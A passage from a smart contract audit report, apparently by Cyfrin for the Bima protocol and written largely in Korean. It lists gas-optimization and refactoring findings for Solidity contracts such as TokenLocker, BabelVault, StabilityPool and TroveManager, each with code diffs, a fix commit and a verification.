        // 1 from the week
        weight = _minCreateProposalWeight(weight-1);
    }
}

// create a new private function called by the public variant and also by `createNewProposal`
function _minCreateProposalWeight(uint256 week) internal view returns (uint256 weight) {
    // store total weight directly into output `weight` return
    weight = tokenLocker.getTotalWeightAt(week);

    // prevent proposal creation if zero total weight for given week
    require(weight > 0, "Zero total voting weight for given week");

    // over-write output return with weight calculation
    weight = (weight * minCreateProposalPct / MAX_PCT);
}

// then change `createNewProposal` to call the new private function passing in the week input
require(accountWeight >= _minCreateProposalWeight(week), "Not enough weight to propose");
```

**Bima:**
커밋 [51200dc](https://github.com/Bima-Labs/bima-v1-core/commit/51200dc63f0ceaf298cc692ce80beab9ce7c0073)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Remove duplicate calculation in `TokenLocker::withdrawWithPenalty`

**Description:** `TokenLocker::withdrawWithPenalty`에서 중복된 [계산](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L878-L879)을 제거하세요:
```diff
- accountData.locked -= uint32((amountToWithdraw + penaltyTotal - unlocked) / lockToTokenRatio);
- totalDecayRate -= uint32((amountToWithdraw + penaltyTotal - unlocked) / lockToTokenRatio);
+ // calculate & cache total amount of locked tokens withdraw inc penalties,
+ // scaled down by lockToTokenRatio
+ uint32 lockedPlusPenalties = SafeCast.toUint32((amountToWithdraw + penaltyTotal - unlocked) / lockToTokenRatio);

+ // update account locked and global totalDecayRate subtracting
+ // locked tokens withdrawn including penalties paid
+ accountData.locked -= lockedPlusPenalties;
+ totalDecayRate -= lockedPlusPenalties;
```

"stack too deep"을 피하기 위해 다음 [줄](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L803C9-L803C74)을 제거하세요:
```diff
- uint32[65535] storage unlocks = accountWeeklyUnlocks[msg.sender];
```

그리고 필요한 곳에서 직접 스토리지 위치를 참조하세요. 예:
```diff
- uint256 lockAmount = unlocks[systemWeek] * lockToTokenRatio;
+ uint256 lockAmount = accountWeeklyUnlocks[msg.sender][systemWeek] * lockToTokenRatio;
```

**Bima:**
커밋 [b8d648a](https://github.com/Bima-Labs/bima-v1-core/commit/b8d648a83ebf3747ff41d0aa20172e65adcb0d5a)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Re-order `TokenLocker::penaltyWithdrawalsEnabled` to save 1 storage slot

**Description:** `totalDecayRate`, `totalUpdatedWeek`, `penaltyWithdrawalsEnabled`가 동일한 스토리지 슬롯에 패킹될 수 있도록 `TokenLocker::penaltyWithdrawalsEnabled`를 `totalUpdatedWeek` 뒤에 배치하세요:
```solidity
// Rate at which the total lock weight decreases each week. The total decay rate may not
// be equal to the total number of locked tokens, as it does not include frozen accounts.
uint32 public totalDecayRate;
// Current week within `totalWeeklyWeights` and `totalWeeklyUnlocks`. When up-to-date
// this value is always equal to `getWeek()`
uint16 public totalUpdatedWeek;

bool public penaltyWithdrawalsEnabled;
uint256 public allowPenaltyWithdrawAfter;
```

**Bima:**
커밋 [08d825a](https://github.com/Bima-Labs/bima-v1-core/commit/08d825a30985d98a441deeeb41e7638e5b1e86a4)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### More efficient and simpler implementation of `BabelVault::setReceiverIsActive`

**Description:** `BabelVault::setReceiverIsActive`는 `account` 필드만 읽으므로 `idToReceiver[id]`를 메모리에 캐시할 필요가 없습니다. 따라서 스토리지의 모든 필드를 읽을 이유가 없습니다.

또한 `isActive` 필드만 업데이트하므로 메모리 복사본을 다시 스토리지에 써서 모든 필드를 업데이트할 이유가 없습니다. 더 효율적이고 간단한 구현은 다음과 같습니다:
```solidity
function setReceiverIsActive(uint256 id, bool isActive) external onlyOwner returns (bool success) {
    // revert if receiver id not associated with an address
    require(idToReceiver[id].account != address(0), "ID not set");

    // update storage - isActive status, address remains the same
    idToReceiver[id].isActive = isActive;

    emit ReceiverIsActiveStatusModified(id, isActive);

    success = true;
}
```

**Bima:**
커밋 [1b12aa5](https://github.com/Bima-Labs/bima-v1-core/commit/1b12aa5b4a5e4f68f08da2dbe1994dfa8ed4a6af)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Remove `BabelVault::receiverUpdatedWeek` and add `updatedWeek` member to struct `Receiver`

**Description:** 매핑 `idToReceiver`는 이미 수신자 ID를 수신자의 데이터에 연결합니다:
```solidity
mapping(uint256 receiverId => Receiver receiverData) public idToReceiver;
```

따라서 `BabelVault::receiverUpdatedWeek`를 제거하고 `Receiver` 구조체에 `updatedWeek` 멤버를 추가하는 것이 더 간단하고 깔끔합니다:
```diff
-   // id -> receiver data
-   uint16[65535] public receiverUpdatedWeek;

    struct Receiver {
        address account;
        bool isActive;
+       uint16 updatedWeek;
    }
```

**Bima:**
커밋 [d93c2ba](https://github.com/Bima-Labs/bima-v1-core/commit/d93c2bae8ca8971af78b3850b3d3935e6fb56609)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Don't cache `calldata` array length

**Description:** `calldata`로 전달된 배열을 반복할 때, 배열 길이를 캐시하지 않는 것이 더 [효율적](https://x.com/DevDacian/status/1791490921881903468)입니다.

**Bima:**
커밋 [4b3ae20](https://github.com/Bima-Labs/bima-v1-core/commit/4b3ae202b99aa232d70858b35e36d2f491557137), [a2232a2](https://github.com/Bima-Labs/bima-v1-core/commit/a2232a2b0dd98e58b2527aa49451ad9d4da4ed7f), [d9998da](https://github.com/Bima-Labs/bima-v1-core/commit/d9998da6e0df31312f960d8d3301f0c39cbdbdf6#diff-20302eb9e2117cabe15d042053d9902a4ebfb2f690d37e85f6127f4f427ad8b6L238-R248)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Use `calldata` instead of `memory` for inputs to `external` functions

**Description:** `external` 함수의 입력에 `memory` 대신 `calldata`를 사용하세요.

**Bima:**
커밋 [7cd87aa](https://github.com/Bima-Labs/bima-v1-core/commit/7cd87aa0a8d4f908d8c2f5e3cae215d2740b8dd0), [22119e1](https://github.com/Bima-Labs/bima-v1-core/commit/22119e1ecee81818ca535b783fa9d1b1a32a66c0), [2ecc532](https://github.com/Bima-Labs/bima-v1-core/commit/2ecc5323b8fecab7f00ab185eb34afec9c654331)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Save 2 storage reads in `StabilityPool::enableCollateral`

**Description:** `StabilityPool::enableCollateral`에서 다음을 통해 2개의 스토리지 읽기를 절약하세요:

1) `queueCached.firstSunsetIndexKey`에서 읽은 다음 나중에 쓰기:
```diff
- delete _sunsetIndexes[queue.firstSunsetIndexKey++];
+ delete _sunsetIndexes[queueCached.firstSunsetIndexKey];
+ ++queue.firstSunsetIndexKey;
```

2) `collateralTokens.length` 대신 `length + 1` 사용하기:
```diff
  collateralTokens.push(_collateral);
- indexByCollateral[_collateral] = collateralTokens.length;
+ indexByCollateral[_collateral] = length + 1;
```

**Bima:**
커밋 [7eef5f9](https://github.com/Bima-Labs/bima-v1-core/commit/7eef5f9e683880ded3bfb60feaecbdc1b2a21884)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Save two storage slots by better storage packing in `TroveManager`

**Description:** `TroveManager`에서 더 나은 스토리지 패킹으로 두 개의 스토리지 슬롯을 절약하세요 - 이 3개의 선언을 `periodFinish` 아래로 재배치하세요:
```solidity
uint256 public rewardIntegral;
uint128 public rewardRate;
uint32 public lastUpdate;
uint32 public periodFinish;

// here for storage packing
bool public sunsetting;
bool public paused;
EmissionId public emissionId;
```

이상적으로는 `TroveManager` 스토리지도 모든 선언을 공통 섹션으로 그룹화하도록 리팩토링되어야 합니다.

**Bima:**
커밋 [305c007](https://github.com/Bima-Labs/bima-v1-core/commit/305c0076552dcb2477b9f9135528b46279446abe)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Optimize away `currentActiveDebt` and `activeInterests` variables from `TroveManager::getEntireSystemDebt`

**Description:** `TroveManager::getEntireSystemDebt`는 `totalActiveDebt`를 명명된 출력 변수로 직접 읽은 다음 사용하여 `currentActiveDebt` 및 `activeInterests` 변수를 최적화할 수 있습니다. 예:
```solidity
function getEntireSystemDebt() public view returns (uint256 debt) {
    debt = totalActiveDebt;

    (, uint256 interestFactor) = _calculateInterestIndex();

    if (interestFactor > 0) {
        debt += Math.mulDiv(debt, interestFactor, INTEREST_PRECISION);
    }

    debt += defaultedDebt;
}
```

동일한 최적화를 `TroveManager::getTotalActiveDebt`에도 적용할 수 있습니다.

**Bima:**
커밋 [e7b13a6](https://github.com/Bima-Labs/bima-v1-core/commit/e7b13a6517bcb624753f6c9a0d01ae04bafd0fff) 및 [2ebd7d8](https://github.com/Bima-Labs/bima-v1-core/commit/2ebd7d8d1c593d4648ffe25d56da2f750b4e7ee0)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Delete `TroveManager::_removeStake` and perform this as part of `_closeTrove` since they always occur together

**Description:** `TroveManager::_removeStake`는 항상 `_closeTrove` 직전에 호출되므로, 함수를 삭제하고 다음과 같이 `_closeTrove` 내에서 더 효율적으로 기능을 구현할 수 있습니다:
```solidity
function _closeTrove(address _borrower, Status closedStatus) internal {
    uint256 TroveOwnersArrayLength = TroveOwners.length;

    // update storage - borrower Trove state
    Trove storage t = Troves[_borrower];
    t.status = closedStatus;
    t.coll = 0;
    t.debt = 0;
    t.activeInterestIndex = 0;
    // _removeStake functionality
    totalStakes -= t.stake;
    t.stake = 0;
    // ...
```

이는 또한 미래에 `_removeStake`를 먼저 호출하는 것을 잊고 `_closeTrove`를 호출하는 코딩 실수를 방지합니다.

**Bima:**
커밋 [6c832fc](https://github.com/Bima-Labs/bima-v1-core/commit/6c832fc031b7686a5bdab4ae1b48908c774f0268)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.
